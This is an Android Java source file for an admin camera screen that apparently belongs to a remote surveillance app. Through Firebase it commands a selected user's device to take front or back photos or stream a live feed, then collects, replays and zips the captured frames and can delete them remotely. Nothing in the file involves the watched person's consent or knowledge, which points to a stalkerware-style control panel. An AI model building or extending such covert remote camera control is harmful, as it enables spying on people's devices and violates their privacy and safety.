package com.vikasyadavnsit.cdc.fragment;

import android.content.ContentValues;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.fragment.app.Fragment;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class AdminCameraFragment extends Fragment {

    private ImageView imgBack, imgFront, imgLive;
    private View liveContainer;
    private Button btnPlayHistory, btnDownloadHistory;
    private ValueEventListener cameraListener;
    private boolean isLiveActive = false;
    private boolean isHistoryPlaying = false;
    private String lastBackBase64, lastFrontBase64, lastLiveBase64;
    private List<String> historyFrames = new ArrayList<>();

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_admin_camera, container, false);

        view.findViewById(R.id.camera_back_button).setOnClickListener(v -> getParentFragmentManager().popBackStack());

        imgBack = view.findViewById(R.id.img_back_preview);
        imgFront = view.findViewById(R.id.img_front_preview);
        imgLive = view.findViewById(R.id.img_live_preview);
        liveContainer = view.findViewById(R.id.live_feed_container);
        
        view.findViewById(R.id.btn_capture_back).setOnClickListener(v -> sendCaptureCommand("BACK"));
        view.findViewById(R.id.btn_capture_front).setOnClickListener(v -> sendCaptureCommand("FRONT"));
        view.findViewById(R.id.btn_capture_both).setOnClickListener(v -> sendCaptureCommand("BOTH"));

        view.findViewById(R.id.btn_live_back).setOnClickListener(v -> toggleLiveFeed("BACK"));
        view.findViewById(R.id.btn_live_front).setOnClickListener(v -> toggleLiveFeed("FRONT"));
        view.findViewById(R.id.btn_live_stop).setOnClickListener(v -> stopLiveFeed());
        
        btnPlayHistory = view.findViewById(R.id.btn_play_history);
        btnPlayHistory.setOnClickListener(v -> playHistory());

        btnDownloadHistory = view.findViewById(R.id.btn_download_history);
        btnDownloadHistory.setOnClickListener(v -> downloadHistoryZip());

        view.findViewById(R.id.camera_delete_all).setOnClickListener(v -> showDeleteOptions());

        imgBack.setOnClickListener(v -> showFullscreen(lastBackBase64, "Back Camera"));
        imgFront.setOnClickListener(v -> showFullscreen(lastFrontBase64, "Front Camera"));
        imgLive.setOnClickListener(v -> showFullscreen(lastLiveBase64, "Live Feed"));

        listenForData();
        return view;
    }

    private void showDeleteOptions() {
        new AlertDialog.Builder(requireContext())
                .setTitle("Delete Camera Data")
                .setItems(new String[]{"Delete Photos", "Delete Live/History"}, (dialog, which) -> {
                    if (which == 0) FirebaseUtils.deleteCameraPhotos();
                    else FirebaseUtils.deleteCameraLive();
                    Toast.makeText(getContext(), "Data deleted", Toast.LENGTH_SHORT).show();
                })
                .show();
    }

    private void showFullscreen(String base64, String title) {
        if (base64 == null || base64.isEmpty()) return;

        android.app.Dialog dialog = new android.app.Dialog(requireContext(), android.R.style.Theme_Black_NoTitleBar_Fullscreen);
        View dialogView = LayoutInflater.from(getContext()).inflate(R.layout.dialog_fullscreen_image, null);
        dialog.setContentView(dialogView);

        ImageView fullImg = dialogView.findViewById(R.id.fullscreen_image_view);
        Button btnDownload = dialogView.findViewById(R.id.btn_download_image);

        byte[] decodedString = Base64.decode(base64, Base64.DEFAULT);
        Bitmap bitmap = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
        fullImg.setImageBitmap(bitmap);

        // Make window truly fullscreen
        Window window = dialog.getWindow();
        if (window != null) {
            window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT);
            window.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(Color.BLACK));
        }

        btnDownload.setOnClickListener(v -> {
            btnDownload.setEnabled(false);
            btnDownload.setText("Downloading...");
            Toast.makeText(getContext(), "Starting download...", Toast.LENGTH_SHORT).show();
            
            v.postDelayed(() -> {
                saveImageToGallery(bitmap, title + "_" + System.currentTimeMillis());
                if (isAdded()) {
                    btnDownload.setEnabled(true);
                    btnDownload.setText("Download PNG");
                }
            }, 500);
        });

        dialogView.findViewById(R.id.btn_close_fullscreen).setOnClickListener(v -> dialog.dismiss());

        dialog.show();
    }

    private void saveImageToGallery(Bitmap bitmap, String name) {
        OutputStream fos;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ContentValues contentValues = new ContentValues();
                contentValues.put(MediaStore.MediaColumns.DISPLAY_NAME, name + ".png");
                contentValues.put(MediaStore.MediaColumns.MIME_TYPE, "image/png");
                contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/CDC");
                Uri imageUri = requireContext().getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues);
                fos = requireContext().getContentResolver().openOutputStream(Objects.requireNonNull(imageUri));
            } else {
                String imagesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString() + "/CDC";
                java.io.File file = new java.io.File(imagesDir);
                if (!file.exists()) file.mkdir();
                java.io.File image = new java.io.File(imagesDir, name + ".png");
                fos = new java.io.FileOutputStream(image);
            }
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            Objects.requireNonNull(fos).close();
            Toast.makeText(getContext(), "Image saved to Gallery", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(getContext(), "Failed to save image", Toast.LENGTH_SHORT).show();
        }
    }

    private void downloadHistoryZip() {
        if (historyFrames.isEmpty()) return;
        
        btnDownloadHistory.setEnabled(false);
        btnDownloadHistory.setText("Zipping...");
        
        new Thread(() -> {
            try {
                String fileName = "CameraHistory_" + System.currentTimeMillis() + ".zip";
                OutputStream os;
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    ContentValues cv = new ContentValues();
                    cv.put(MediaStore.MediaColumns.DISPLAY_NAME, fileName);
                    cv.put(MediaStore.MediaColumns.MIME_TYPE, "application/zip");
                    cv.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS + "/CDC");
                    Uri uri = requireContext().getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, cv);
                    os = requireContext().getContentResolver().openOutputStream(Objects.requireNonNull(uri));
                } else {
                    File path = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "CDC");
                    if (!path.exists()) path.mkdirs();
                    os = new FileOutputStream(new File(path, fileName));
                }

                try (ZipOutputStream zos = new ZipOutputStream(os)) {
                    for (int i = 0; i < historyFrames.size(); i++) {
                        byte[] bytes = Base64.decode(historyFrames.get(i), Base64.DEFAULT);
                        ZipEntry entry = new ZipEntry("frame_" + (i + 1) + ".jpg");
                        zos.putNextEntry(entry);
                        zos.write(bytes);
                        zos.closeEntry();
                    }
                }
                
                if (getActivity() != null) {
                    getActivity().runOnUiThread(() -> {
                        Toast.makeText(getContext(), "History saved to Downloads/CDC", Toast.LENGTH_LONG).show();
                        btnDownloadHistory.setEnabled(true);
                        btnDownloadHistory.setText("Download History (ZIP)");
                    });
                }
            } catch (Exception e) {
                if (getActivity() != null) {
                    getActivity().runOnUiThread(() -> {
                        Toast.makeText(getContext(), "Failed to create ZIP", Toast.LENGTH_SHORT).show();
                        btnDownloadHistory.setEnabled(true);
                        btnDownloadHistory.setText("Download History (ZIP)");
                    });
                }
            }
        }).start();
    }

    private void sendCaptureCommand(String type) {
        Map<String, Object> command = new HashMap<>();
        command.put("action", "CAPTURE");
        command.put("type", type);
        command.put("timestamp", System.currentTimeMillis());
        
        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/commands/cameraRequest")).setValue(command);
        Toast.makeText(getContext(), "Capture command sent (" + type + ")", Toast.LENGTH_SHORT).show();
    }

    private void toggleLiveFeed(String side) {
        isLiveActive = true;
        updateLiveUiState();

        Map<String, Object> command = new HashMap<>();
        command.put("action", "START_LIVE");
        command.put("type", side);
        command.put("timestamp", System.currentTimeMillis());

        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/commands/cameraRequest")).setValue(command);
        
        // Start pulsing dot loop
        final View liveDot = getView().findViewById(R.id.live_dot);
        if (liveDot != null) {
            Runnable pulse = new Runnable() {
                @Override
                public void run() {
                    if (isLiveActive) {
                        liveDot.animate().alpha(0f).setDuration(800).withEndAction(() -> {
                            liveDot.animate().alpha(1f).setDuration(800).withEndAction(this).start();
                        }).start();
                    }
                }
            };
            liveDot.post(pulse);
        }
    }

    private void stopLiveFeed() {
        isLiveActive = false;
        updateLiveUiState();

        Map<String, Object> command = new HashMap<>();
        command.put("action", "STOP_LIVE");
        command.put("timestamp", System.currentTimeMillis());

        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/commands/cameraRequest")).setValue(command);
    }

    private void updateLiveUiState() {
        View view = getView();
        if (view == null) return;
        View stopBtn = view.findViewById(R.id.btn_live_stop);
        View backBtn = view.findViewById(R.id.btn_live_back);
        View frontBtn = view.findViewById(R.id.btn_live_front);
        View liveDot = view.findViewById(R.id.live_dot);

        if (isLiveActive) {
            stopBtn.setVisibility(View.VISIBLE);
            backBtn.setVisibility(View.GONE);
            frontBtn.setVisibility(View.GONE);
            liveContainer.setVisibility(View.VISIBLE);
            
            // Pulsing animation for live dot
            if (liveDot != null) {
                liveDot.animate().alpha(0.3f).setDuration(500).withEndAction(() -> {
                    if (isLiveActive) liveDot.animate().alpha(1.0f).setDuration(500).start();
                }).start();
            }
        } else {
            stopBtn.setVisibility(View.GONE);
            backBtn.setVisibility(View.VISIBLE);
            frontBtn.setVisibility(View.VISIBLE);
            if (liveDot != null) liveDot.animate().cancel();
        }
    }

    private void playHistory() {
        if (historyFrames.isEmpty()) return;
        isHistoryPlaying = true;
        btnPlayHistory.setEnabled(false);
        liveContainer.setVisibility(View.VISIBLE);
        
        final int[] idx = {0};
        final Runnable player = new Runnable() {
            @Override
            public void run() {
                if (idx[0] < historyFrames.size()) {
                    updateImage(historyFrames.get(idx[0]++), imgLive);
                    imgLive.postDelayed(this, 1000);
                } else {
                    isHistoryPlaying = false;
                    btnPlayHistory.setEnabled(true);
                    updateImage(lastLiveBase64, imgLive); // Restore current
                }
            }
        };
        imgLive.post(player);
    }

    private void listenForData() {
        cameraListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!isAdded()) return;
                if (!snapshot.exists()) {
                    imgBack.setImageDrawable(null);
                    imgFront.setImageDrawable(null);
                    imgLive.setImageDrawable(null);
                    lastBackBase64 = lastFrontBase64 = lastLiveBase64 = null;
                    historyFrames.clear();
                    btnPlayHistory.setVisibility(View.GONE);
                    return;
                }

                lastBackBase64 = snapshot.child("back/latest").getValue(String.class);
                lastFrontBase64 = snapshot.child("front/latest").getValue(String.class);
                lastLiveBase64 = snapshot.child("live/current").getValue(String.class);

                updateImage(lastBackBase64, imgBack);
                updateImage(lastFrontBase64, imgFront);
                if (!isHistoryPlaying) updateImage(lastLiveBase64, imgLive);

                // Update history from today's live feed history
                String date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault()).format(new java.util.Date());
                historyFrames.clear();
                DataSnapshot histSnap = snapshot.child("live/history/" + date);
                for (DataSnapshot frame : histSnap.getChildren()) {
                    String b64 = frame.getValue(String.class);
                    if (b64 != null) historyFrames.add(b64);
                }
                btnPlayHistory.setVisibility(historyFrames.isEmpty() ? View.GONE : View.VISIBLE);
                btnDownloadHistory.setVisibility(historyFrames.isEmpty() ? View.GONE : View.VISIBLE);
            }

            @Override public void onCancelled(@NonNull DatabaseError error) {}
        };
        FirebaseUtils.monitorCameraData(cameraListener);
    }

    private void updateImage(String base64, ImageView target) {
        if (base64 == null || base64.isEmpty()) return;
        try {
            byte[] decodedString = Base64.decode(base64, Base64.DEFAULT);
            Bitmap decodedByte = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
            
            if (target == imgLive) {
                // Fast direct update for live feed and history playback
                target.setImageBitmap(decodedByte);
                return;
            }

            // Smooth animation for static captures
            target.animate().alpha(0f).setDuration(150).withEndAction(() -> {
                if (isAdded()) {
                    target.setImageBitmap(decodedByte);
                    target.animate().alpha(1f).setDuration(150).start();
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroyView() {
        if (isLiveActive) {
            stopLiveFeed();
        }
        FirebaseUtils.removeCameraDataListener(cameraListener);
        super.onDestroyView();
    }
}
